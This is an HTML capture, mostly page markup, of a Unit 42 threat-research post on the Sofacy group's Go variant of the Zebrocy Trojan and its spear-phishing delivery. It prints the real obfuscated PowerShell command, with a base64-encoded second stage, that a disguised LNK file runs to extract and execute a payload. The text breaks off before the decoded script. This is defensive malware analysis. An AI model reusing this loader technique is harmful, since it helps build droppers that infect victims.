var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.min.js?ver=_2.7.2_beta'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpp_params = {"sampling_active":"0","sampling_rate":"100","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-json\/wordpress-popular-posts\/v1\/popular-posts","ID":"95929","token":"b09d8c8c9d","debug":""};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/js/wpp-5.0.0.min.js?ver=5.0.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpml_xdomain_data = {"css_selector":"wpml-ls-item","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","current_lang":"en"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/res/js/xdomain-data.js?ver=4.3.5'></script>
<link rel='https://api.w.org/' href='https://unit42.paloaltonetworks.com/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://unit42.paloaltonetworks.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://unit42.paloaltonetworks.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.4.1" />
<link rel='shortlink' href='https://unit42.paloaltonetworks.com/?p=95929' />
<link rel="alternate" type="application/json+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fsofacy-creates-new-go-variant-of-zebrocy-tool%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fsofacy-creates-new-go-variant-of-zebrocy-tool%2F&#038;format=xml" />
<meta name="generator" content="WPML ver:4.3.5 stt:1,28;" />
<meta name="google-site-verification" content="zHZtYOWm9hm4SZgsH7wqiYcOwmsAsxDUDU4UD1QxB40" /><style>#wpdevart_lb_overlay{background-color:#000000;} #wpdevart_lb_overlay.wpdevart_opacity{opacity:0.8 !important;} #wpdevart_lb_main_desc{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;} #wpdevart_lb_information_content{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;}
		#wpdevart_lb_information_content{
			width:100%;	
		}
		#wpdevart_info_counter_of_imgs{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_caption{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_title{
			    display: inline-block;
				padding-left:5px;
				padding-right:5px;
				font-size:15px;
				color:#000000;
		}
		@-webkit-keyframes rotate {
			to   {-webkit-transform: rotate(360deg);}
			from  {-webkit-transform: rotate(0deg);}
		}
		@keyframes rotate {
			to   {transform: rotate(360deg);}
			from  {transform: rotate(0deg);}
		}
		#wpdevart_lb_loading_img,#wpdevart_lb_loading_img_first{
			-webkit-animation: rotate 2s linear  infinite;
    		animation: rotate 2s linear infinite;
		}
	  </style>        <script>var $ = jQuery;</script>
  
  
<script type="text/javascript">
;(function(win, doc, style, timeout) {
var STYLE_ID = 'at-body-style';
function getParent() {
return doc.getElementsByTagName('head')[0];
}
function addStyle(parent, id, def) {
if (!parent) {
return;
}
var style = doc.createElement('style');
style.id = id;
style.innerHTML = def;
parent.appendChild(style);
}
function removeStyle(parent, id) {
if (!parent) {
return;
}
var style = doc.getElementById(id);
if (!style) {
return;
}
parent.removeChild(style);
}
addStyle(getParent(), STYLE_ID, style);
setTimeout(function() {
removeStyle(getParent(), STYLE_ID);
}, timeout);
}(window, document, "body {visibility:hidden !important}", 3000));
</script>

<script src="//assets.adobedtm.com/9273d4aedcd2/0d76ae0322d7/launch-425c423d843b.min.js" async></script>
<script type="text/javascript" src="https://www.paloaltonetworks.com/content/dam/pan/en_US/includes/attribution.js"></script>
  </head>
  <body class="post-template-default single single-post postid-95929 single-format-standard">
    <!--[if IE]>
      <div class="alert alert-warning">
        You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.      </div>
    <![endif]-->
    <header class="haeder py-15 position-relative z-index-2">
  <div class="container px-sm-30 px-35">
    <div class="row">
      <div class="first-logo col-sm-auto col-6 mb-sm-0 mb-40 text-sm-center order-1">
                  <a href="https://www.paloaltonetworks.com/">
<!--<img src="/wp-content/uploads/2019/07/paloaltonetwork.svg" class="attachment-full size-full" alt="" height="43" width="124" />-->
<svg width="140" height="26" viewBox="0 0 140 26" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M59.4802 4.69592C57.6721 4.69592 55.7937 5.18876 53.469 6.43377L54.7605 9.62741C56.7794 8.50019 58.447 8.00735 59.6682 8.00735C61.0538 8.00735 61.6644 8.52395 61.6644 9.20483V9.25133C61.6644 9.72143 61.2883 9.97974 60.3729 10.0738L58.7766 10.238C54.7843 10.6606 53.1404 12.3985 53.1404 14.7934V14.9577C53.1404 17.2359 55.0188 19.0203 57.6721 19.0203C59.4192 19.0203 60.937 18.2826 61.8597 16.9807L62.1572 18.7857H65.7734V10.5904C65.7734 6.71584 63.5428 4.69592 59.4802 4.69592ZM59.1279 15.8969C57.7899 15.8969 57.1555 15.3803 57.1555 14.5816V14.5351C57.1555 13.8305 57.5543 13.3139 59.0101 13.1031L59.6445 13.0091C60.5713 12.8799 61.1406 12.7095 61.6644 12.3923V13.4317C61.6644 15.0052 60.6777 15.8969 59.1279 15.8969Z" fill="white"/>
<path d="M25.4785 4.78994L20.8528 0.164276L16.2271 4.78994L18.5281 7.09192L6.92828 18.6917L11.5539 23.3174L16.1796 18.6917L13.8787 16.3908L25.4785 4.78994Z" fill="white"/>
<path d="M11.6001 0.164048L0 11.7642L4.62603 16.3902L16.2262 4.79008L11.6001 0.164048Z" fill="white"/>
<path d="M27.7794 7.09215L16.1793 18.6923L20.8053 23.3183L32.4054 11.7182L27.7794 7.09215Z" fill="white"/>
<path d="M72.231 0H68.1219V18.7857H72.231V0Z" fill="white"/>
<path d="M46.2366 4.69592C44.3685 4.69592 42.8683 5.52249 42.0428 6.81709L41.7287 4.93046H38.1125V23.4806H42.2215V17.051C43.0037 18.2567 44.4832 19.0193 46.2366 19.0193C49.5242 19.0193 52.2013 16.1077 52.2013 12.0916V11.6215C52.2013 7.60853 49.5242 4.69592 46.2366 4.69592ZM47.9744 11.9759C47.9744 14.0888 46.871 15.6159 45.0391 15.6159C43.2072 15.6159 42.1038 14.0898 42.1038 11.9759V11.7414C42.1038 9.62741 43.2072 8.10137 45.0391 8.10137C46.871 8.10137 47.9744 9.62741 47.9744 11.7414V11.9759Z" fill="white"/>
<path d="M127.672 4.69592C123.469 4.69592 120.51 7.6075 120.51 11.6236V12.0937C120.51 16.1087 123.469 19.0213 127.672 19.0213C131.875 19.0213 134.834 16.1097 134.834 12.0937V11.6236C134.834 7.60853 131.875 4.69592 127.672 4.69592ZM130.607 11.9759C130.607 14.0888 129.504 15.6159 127.672 15.6159C125.84 15.6159 124.736 14.0898 124.736 11.9759V11.7414C124.736 9.62741 125.84 8.10137 127.672 8.10137C129.504 8.10137 130.607 9.62741 130.607 11.7414V11.9759Z" fill="white"/>
<path d="M138.708 5.54211V5.47185C138.708 5.07304 138.404 4.79097 137.863 4.79097H136.924V6.9514H137.37V6.22299H137.866L138.239 6.9514H138.732L138.274 6.09694C138.552 6.01119 138.708 5.80248 138.708 5.54211ZM137.369 5.18979H137.862C138.144 5.18979 138.261 5.28381 138.261 5.49562V5.51938C138.261 5.70742 138.143 5.82418 137.862 5.82418H137.369V5.18979Z" fill="white"/>
<path d="M137.769 3.63998C136.502 3.63998 135.539 4.60293 135.539 5.87067C135.539 7.13842 136.502 8.10137 137.769 8.10137C139.037 8.10137 140 7.13842 140 5.87067C140 4.60293 139.037 3.63998 137.769 3.63998ZM137.769 7.79554C136.666 7.79554 135.867 6.99687 135.867 5.86964C135.867 4.74241 136.666 3.94375 137.769 3.94375C138.873 3.94375 139.671 4.74241 139.671 5.86964C139.671 6.99687 138.873 7.79554 137.769 7.79554Z" fill="white"/>
<path d="M108.416 0H104.307V18.7857H108.416V0Z" fill="white"/>
<path d="M116.518 15.6159C115.321 15.6159 114.874 15.029 114.874 13.7613V8.10137H119.712V4.93149H114.874V1.76058L110.765 2.37121V14.159C110.765 17.3765 112.409 19.0203 115.697 19.0203C117.153 19.0203 118.867 18.5739 120.276 17.7753L119.102 14.8637C118.279 15.31 117.129 15.6159 116.518 15.6159Z" fill="white"/>
<path d="M95.6662 4.69592C93.8581 4.69592 91.9797 5.18876 89.655 6.43377L90.9465 9.62741C92.9654 8.50019 94.633 8.00735 95.8542 8.00735C97.2397 8.00735 97.8504 8.52395 97.8504 9.20483V9.25133C97.8504 9.72143 97.4743 9.97974 96.5589 10.0738L94.9626 10.238C90.9702 10.6606 89.3264 12.3985 89.3264 14.7934V14.9577C89.3264 17.2359 91.2048 19.0203 93.8581 19.0203C95.6042 19.0203 97.123 18.2826 98.0456 16.9807L98.3432 18.7857H101.959V10.5904C101.959 6.71584 99.7287 4.69592 95.6662 4.69592ZM95.3138 15.8969C93.9748 15.8969 93.3415 15.3803 93.3415 14.5816V14.5351C93.3415 13.8305 93.7403 13.3139 95.1961 13.1031L95.8304 13.0091C96.7572 12.8799 97.3265 12.7095 97.8493 12.3923V13.4317C97.8493 15.0052 96.8637 15.8969 95.3138 15.8969Z" fill="white"/>
<path d="M81.225 4.69592C77.022 4.69592 74.0629 7.6075 74.0629 11.6236V12.0937C74.0629 16.1087 77.022 19.0213 81.225 19.0213C85.4281 19.0213 88.3872 16.1097 88.3872 12.0937V11.6236C88.3862 7.60853 85.4281 4.69592 81.225 4.69592ZM84.1593 11.9759C84.1593 14.0888 83.0559 15.6159 81.224 15.6159C79.3921 15.6159 78.2887 14.0898 78.2887 11.9759V11.7414C78.2887 9.62741 79.3921 8.10137 81.224 8.10137C83.0559 8.10137 84.1593 9.62741 84.1593 11.7414V11.9759Z" fill="white"/>
<path d="M98.0446 22.1168H99.0975L100.551 24.0334H100.566V22.1168H101.532V25.4964H100.513L99.0251 23.5313H99.0107V25.4964H98.0446V22.1168Z" fill="white"/>
<path d="M102.816 22.1168H105.771L105.81 22.9372H103.825V23.4011H105.385V24.1491H103.825V24.676H105.868L105.829 25.4964H102.816V22.1168Z" fill="white"/>
<path d="M107.925 22.9857H106.742L106.78 22.1168H110.088L110.127 22.9857H108.944V25.4964H107.925V22.9857Z" fill="white"/>
<path d="M110.943 22.1168H112.024L112.575 24.4632H112.628L113.342 22.1168H114.333L115.033 24.4632H115.086L115.627 22.1168H116.66L115.771 25.4964H114.444L113.826 23.4589H113.797L113.169 25.4964H111.836L110.943 22.1168Z" fill="white"/>
<path d="M117.404 23.8071C117.404 22.7057 118.152 22.0155 119.335 22.0155C120.518 22.0155 121.267 22.7057 121.267 23.8071C121.267 24.9085 120.519 25.5987 119.335 25.5987C118.152 25.5987 117.404 24.9075 117.404 23.8071ZM120.257 23.8071C120.257 23.2234 119.92 22.8752 119.335 22.8752C118.75 22.8752 118.412 23.2234 118.412 23.8071C118.412 24.3919 118.75 24.7391 119.33 24.7391C119.914 24.7391 120.257 24.3909 120.257 23.8071Z" fill="white"/>
<path d="M122.363 22.1168H124.334C125.231 22.1168 125.672 22.5414 125.672 23.3287C125.672 23.8691 125.449 24.2369 125.014 24.4105L125.816 25.4974H124.667L124.044 24.6089H123.378V25.4974H122.363V22.1168ZM124.202 23.8164C124.54 23.8164 124.661 23.6284 124.661 23.3721C124.661 23.1159 124.54 22.933 124.202 22.933H123.377V23.8164H124.202Z" fill="white"/>
<path d="M126.989 22.1168H128.002V23.3628H128.418L129.408 22.1168H130.547L130.552 22.1209L129.259 23.7389L130.625 25.4923L130.62 25.4964H129.437L128.414 24.1977H128.002V25.4964H126.989V22.1168Z" fill="white"/>
<path d="M131.402 25.2743V24.3475H131.407C131.972 24.6327 132.523 24.7721 133 24.7721C133.363 24.7721 133.546 24.6853 133.546 24.5159C133.546 24.3465 133.425 24.3031 132.7 24.1873C131.909 24.0623 131.382 23.8247 131.382 23.1438C131.382 22.5115 131.938 22.0238 133.024 22.0238C133.459 22.0238 133.912 22.1158 134.333 22.2945V23.212L134.328 23.2172C133.927 22.9857 133.386 22.84 132.951 22.84C132.565 22.84 132.411 22.932 132.411 23.0859C132.411 23.2843 132.648 23.3029 133.242 23.4052C134.033 23.5406 134.56 23.7627 134.56 24.4777C134.56 25.0325 134.145 25.5884 132.952 25.5884C132.364 25.5884 131.894 25.4675 131.402 25.2743Z" fill="white"/>
</svg>

</a>

      </div>

      <div class="col-sm-auto col-6 text-sm-center order-sm-2 order-4 second-logo-unit">
        <a href="https://unit42.paloaltonetworks.com/"><img src="/wp-content/uploads/2019/07/unit42.svg" class="attachment-full size-full" alt="" height="35" width="105" /></a>
      </div>

      <div class="col-auto d-sm-none ml-auto mb-40 order-2">
        <button class="btn__search" data-toggle="collapse" data-target="#search"><i class="ui ui-1"></i></button>
      </div>

      <div id="search" class="collapse d-sm-block col-sm-auto col-12 ml-auto order-3">
        <div class="pt-sm-0 pt-20 pb-sm-0 pb-40 mt-sm-0 mt-n30">
                      <input type="search" placeholder="Search Unit 42" id="innerSearch" class="header__search" value="" required>
                  </div>
      </div>

      <div class="col-auto d-sm-none d-flex ml-auto align-items-center order-5">
        <button class="btn__menu rounded" data-toggle="collapse" data-target="#navigation">Menu</button>
      </div>
    </div>
  </div>
</header>

<nav id="navigation" class="site-nav collapse d-sm-block pb-20 mt-sm-10">
  <div class="container px-sm-30">
    <ul id="menu-primary-navigation" class="main-menu d-sm-flex font-weight-medium"><li id="menu-item-97290" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-97290"><a href="https://unit42.paloaltonetworks.com/tools/">Tools</a></li>
<li id="menu-item-41" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-41"><a href="https://unit42.paloaltonetworks.com/atoms/">ATOMs</a></li>
<li id="menu-item-98931" class="menu-item menu-item-type-post_type_archive menu-item-object-events menu-item-98931"><a href="https://unit42.paloaltonetworks.com/events/">Speaking Events</a></li>
<li id="menu-item-81229" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-81229"><a href="https://unit42.paloaltonetworks.com/about-unit-42/">About Us</a></li>
</ul>  </div>
</nav>

  <article class="article overflow-hidden">
    
<header class="article__header py-sm-25 pt-40 pb-25 bg-gray-700">
  <div class="container">
    
    <h1 class="article__header__title mb-sm-30 mb-40">Sofacy Creates New ‘Go’ Variant of Zebrocy Tool</h1>

    <ul class="article__entry-meta d-flex flex-wrap align-items-center text-black">
      <li class="mr-10 mb-10 px-20 rounded-pill d-flex bg-gray-200"><div class="post-views post-95929 entry-meta">
			
			
			<span class="post-views-count">30,301</span>
			</div> <span class="ml-5">people reacted</span></li>
      <li class="d-sm-none col-12 p-0"></li>
      <li class="mr-10 mb-10 px-20 rounded-pill bg-gray-200"><span class="ldc-ul_cont idc_ul_cont_not_liked_inner" onclick="alter_ul_post_values(this,'95929','like')"><i class="ui ui-2"></i><span class="ml-5">4</span></span></li>
      <li class="mb-10 px-20 rounded-pill bg-gray-200"><span class="span-reading-time rt-reading-time"><span class="rt-label rt-prefix"></span> <span class="rt-time"> 10</span> <span class="rt-label rt-postfix"></span></span> min. read</li>
    </ul>

    <div class="article__share position-relative">
      <div class="dropdown dropdown-right">
        <button type="button" class="px-25 text-black bg-white text-uppercase rounded-pill" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Share <i class="ui ui-6 ml-10 align-text-top"></i>
        </button>
        <div class="dropdown-menu rounded-pill" role="toolbar">
          <div class="share-dropdown px-20 py-10 text-black font-size-sm">
            <div class="row align-items-center flex-nowrap">
              <div class="col">
                <div class="d-flex align-items-center">
                  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Funit42.paloaltonetworks.com%2Fsofacy-creates-new-go-variant-of-zebrocy-tool%2F" target="_blank"><i class="ui ui-7"></i></a>
                  <a href="https://twitter.com/home?status=https%3A%2F%2Funit42.paloaltonetworks.com%2Fsofacy-creates-new-go-variant-of-zebrocy-tool%2F+-+Sofacy+Creates+New+%E2%80%98Go%E2%80%99+Variant+of+Zebrocy+Tool" target="_blank"><i class="ui ui-8"></i></a>
                  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fsofacy-creates-new-go-variant-of-zebrocy-tool%2F&title=Sofacy+Creates+New+%E2%80%98Go%E2%80%99+Variant+of+Zebrocy+Tool&summary=&source=" target="_blank"><i class="ui ui-9"></i></a>
                  <a href="//www.reddit.com/submit?url=https://unit42.paloaltonetworks.com/sofacy-creates-new-go-variant-of-zebrocy-tool/" target="_blank"><i class="ui ui-10"></i></a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</header>    <div class="article__summary py-25 text-gray-500 font-size-sm">
  <div class="container">
    <div class="row align-items-center no-gutters">
      <div class="col-sm-auto col-12 mb-sm-0 mb-35">
        <i class="ui ui-11 text-gray-700 mr-sm-20"></i>
      </div>
  
      <div class="col-sm col-12">
        <p>
          By <a href="https://unit42.paloaltonetworks.com/author/robertfalcone/" title="Posts by Robert Falcone" class="author url fn" rel="author">Robert Falcone</a>        </p>
        <p><time datetime="2018-12-18T04:00:42+00:00">December 18, 2018 at 6:00 AM</time></p>
        <p>Category: <a href="https://unit42.paloaltonetworks.com/category/unit-42/" rel="category tag">Unit 42</a></p>
        <p>Tags: <a href="https://unit42.paloaltonetworks.com/tag/sofacy/" rel="tag">Sofacy</a>, <a href="https://unit42.paloaltonetworks.com/tag/zebrocy/" rel="tag">Zebrocy</a></p>
      </div>
    </div>
  </div>
</div>    <div class="py-30 bg-white">
      <div class="container">
        <div class="article__content pb-30">
                      <figure class="mb-30 text-center">
              <img width="900" height="450" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/zebrocy_go_crop-900x450.png" class="attachment-single size-single" alt="" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/zebrocy_go_crop-900x450.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/zebrocy_go_crop-300x150.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/zebrocy_go_crop-768x384.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/zebrocy_go_crop-1024x512.png 1024w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/zebrocy_go_crop-370x185.png 370w" sizes="(max-width: 900px) 100vw, 900px" />            </figure>
                    <p>The Sofacy threat group continues to carry out attacks using their Zebrocy tool. We first wrote about the Zebrocy tool in a blog that discussed <a href="https://researchcenter.paloaltonetworks.com/2018/06/unit42-sofacy-groups-parallel-attacks/">Sofacy’s parallel attack campaigns</a> during the first quarter of 2018, and more recently during <a href="https://researchcenter.paloaltonetworks.com/2018/11/unit42-sofacy-continues-global-attacks-wheels-new-cannon-trojan/">Sofacy attacks in late October and early November</a>. The developers of Zebrocy have once again created a new version the Trojan using a different programming language, specifically the <a href="https://en.wikipedia.org/wiki/Go_(programming_language)">Go language</a>. The use of a different programming language to create a functionally similar Trojan is not new to this group, as past Zebrocy variants have been developed in <a href="https://en.wikipedia.org/wiki/AutoIt">AutoIt</a>, <a href="https://en.wikipedia.org/wiki/Object_Pascal">Delphi</a>, VB.NET, C# and <a href="https://en.wikipedia.org/wiki/Microsoft_Visual_C%2B%2B">Visual C++</a>. While we cannot be certain the impetus for this, we believe the threat group uses multiple languages to create their Trojans to make them differ structurally and visually to make detection more difficult.</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>We have seen two separate attacks deliver the Go variant of Zebrocy. The first attack occurred on October 11 and relied on a spear-phishing email with an LNK shortcut attachment. The LNK shortcut is meant to run a series of PowerShell scripts to extract a payload from the shortcut to install and execute; however, the PowerShell scripts were coded incorrectly and could not install or run the payload as delivered. Therefore, the first observed attack mentioned in this blog could not be successful, but the tactics, techniques and indicators are worth discussing for situational awareness. More recently, we have seen Sofacy delivering the Go variant of Zebrocy using a document related to the <a href="https://researchcenter.paloaltonetworks.com/2018/12/dear-joohn-sofacy-groups-global-campaign/">Dear Joohn attack campaign</a> that occurred in mid-October through mid-November.</p>
<p>&nbsp;</p>
<h3></h3>
<p><strong>The First Attack</strong></p>
<p>The attack occurred on October 11, 2018 and involved a spear-phishing email (<a href="https://attack.mitre.org/techniques/T1193/">T1193</a>) discussing the effects of US sanctions on the Russian economy. The “From” address and the signature included the name of an individual at the targeted organization. The “To” field in the delivery email was blank, which makes us believe that the targeted individuals were included in the “Bcc” field of this email. Figure 1 shows the delivery email used in this attack.</p>
<p>&nbsp;</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy1-300x198.png" rel="wpdevart_lightbox"><img class="wp-image-95934 aligncenter" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy1-300x198.png" alt="" width="501" height="331" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy1-300x198.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy1-900x594.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy1-768x507.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy1-370x244.png 370w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy1.png 974w" sizes="(max-width: 501px) 100vw, 501px" /></a></p>
<p style="text-align: center"><em>Figure 1 Delivery email used in Go Zebrocy attack</em></p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p><strong>The Payload</strong></p>
<p>The delivery document <span style="font-family: courier new, courier, monospace">Противодействие Думы Санкциям США.doc (SHA256:d77eb89501b0a60322bc69692007b9b7f1b5a85541a2aaf21caf7baf0fe0049e)</span> attempts to masquerade as a Word document, however, the file is a shortcut LNK. When opened (<a href="https://attack.mitre.org/techniques/T1204/">T1204</a>), the LNK file attempts to run the following command line in a visible command prompt (<a href="https://attack.mitre.org/techniques/T1059/">T1059</a>):</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f69288f18163729741041" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
powershell.exe -nop -w 1 $i853=[TeXt.EnCoDING]::utF8.geTStrInG([conVErT]::frOmbaSE64stRing('JHAxLCRwMj0zNjU5LDY5MjQ3NjQ7JHBhdGhUb0xOSz0nQzUgcmVnaW9uYWwgY29uZmVyZW5jZSBhbmQgdHJhaW5pbmcgd29ya3Nob3Agb24gY29tbXVuaXR5IHBvbGljaW5nKDEpLmRvY3gubG5rJztpZigtbk9UKFRlU3QtcEF0SCAkcGF0aFRvTE5LKSl7JERpckQ9R2VULUNISUxkSVRFTSAtcEF0aCAkZW52OnRlbXAgLWZpTFRlciAkcGF0aFRvTE5LIC1yRWNVclNFO1tpTy5kaVJlY3RvUlldOjpzRVRDVXJyZW50RElyRWN0b1JZKCREaXJELmRJcmVDVE9SWU5BTWUpO30kRmlsZVN0cmVhbWE9bkV3LW9iakVDVCBpby5mSUxlU1RyZUFtICRwYXRoVG9MTkssJ09wZU4nLCdSZUFkJywncmVhRHdSSVRFJzskQXJyYXlNYXM9TkV3LW9iamVjVCBieVRFW10oJHAyKTskRmlsZVN0cmVhbWEuU0VlSygkcDEsW2lvLlNlRUtvUmlHaW5dOjpCRUdpbik7JEZpbGVTdHJlYW1hLnJFQUQoJEFycmF5TWFzLDAsJHAyKTskQXJyYXlNYXM9W0NvbnZlclRdOjpGck9tYmFzRTY0Q0hhckFyUkF5KCRBcnJheU1hcywwLCRBcnJheU1hcy5MZU5HVGgpOyRkdWFjYWp1QT1bdGV4VC5FbkNPZEluR106OlVuaWNvZGUuZ0VUc3RSSW5nKCRBcnJheU1hcyk7aWVYICRkdWFjYWp1QTs='));ieX $i853;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f69288f18163729741041-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f69288f18163729741041-1"><span class="crayon-v">powershell</span><span class="crayon-sy">.</span><span class="crayon-v">exe</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">nop</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">w</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">i853</span><span class="crayon-o">=</span><span class="crayon-sy">[</span><span class="crayon-v">TeXt</span><span class="crayon-sy">.</span><span class="crayon-v">EnCoDING</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">utF8</span><span class="crayon-sy">.</span><span class="crayon-e">geTStrInG</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-v">conVErT</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-e">frOmbaSE64stRing</span><span class="crayon-sy">(</span><span class="crayon-s">'JHAxLCRwMj0zNjU5LDY5MjQ3NjQ7JHBhdGhUb0xOSz0nQzUgcmVnaW9uYWwgY29uZmVyZW5jZSBhbmQgdHJhaW5pbmcgd29ya3Nob3Agb24gY29tbXVuaXR5IHBvbGljaW5nKDEpLmRvY3gubG5rJztpZigtbk9UKFRlU3QtcEF0SCAkcGF0aFRvTE5LKSl7JERpckQ9R2VULUNISUxkSVRFTSAtcEF0aCAkZW52OnRlbXAgLWZpTFRlciAkcGF0aFRvTE5LIC1yRWNVclNFO1tpTy5kaVJlY3RvUlldOjpzRVRDVXJyZW50RElyRWN0b1JZKCREaXJELmRJcmVDVE9SWU5BTWUpO30kRmlsZVN0cmVhbWE9bkV3LW9iakVDVCBpby5mSUxlU1RyZUFtICRwYXRoVG9MTkssJ09wZU4nLCdSZUFkJywncmVhRHdSSVRFJzskQXJyYXlNYXM9TkV3LW9iamVjVCBieVRFW10oJHAyKTskRmlsZVN0cmVhbWEuU0VlSygkcDEsW2lvLlNlRUtvUmlHaW5dOjpCRUdpbik7JEZpbGVTdHJlYW1hLnJFQUQoJEFycmF5TWFzLDAsJHAyKTskQXJyYXlNYXM9W0NvbnZlclRdOjpGck9tYmFzRTY0Q0hhckFyUkF5KCRBcnJheU1hcywwLCRBcnJheU1hcy5MZU5HVGgpOyRkdWFjYWp1QT1bdGV4VC5FbkNPZEluR106OlVuaWNvZGUuZ0VUc3RSSW5nKCRBcnJheU1hcyk7aWVYICRkdWFjYWp1QTs='</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-i">ieX</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">i853</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0005 seconds] -->
<p>&nbsp;</p>
<p>The shortcut uses PowerShell (<a href="https://attack.mitre.org/techniques/T1086/">T1086</a>) to base64 decode (<a href="https://attack.mitre.org/techniques/T1140/">T1140</a>) a second PowerShell script and executes it. The second PowerShell script decodes to the following:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

